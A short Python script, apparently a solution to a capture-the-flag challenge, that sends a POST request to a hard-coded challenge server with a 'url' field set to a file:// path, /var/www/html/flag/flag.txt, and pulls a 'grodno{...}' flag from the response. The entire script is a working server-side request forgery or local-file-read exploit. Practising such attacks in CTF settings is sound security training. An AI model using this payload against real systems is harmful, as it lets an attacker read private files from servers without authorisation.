import requests
import re

def main(url):

	flag_re = 'grodno{.*?}'
	data={
		'url':'file:///var/www/html/flag/flag.txt'
	}
	req = requests.post(url, data)
	# print (req.text)
	flag = re.findall(flag_re, req.text)
	print(flag[0])

if __name__=='__main__':
	url='http://45.88.77.177:21004/'
	main(url)
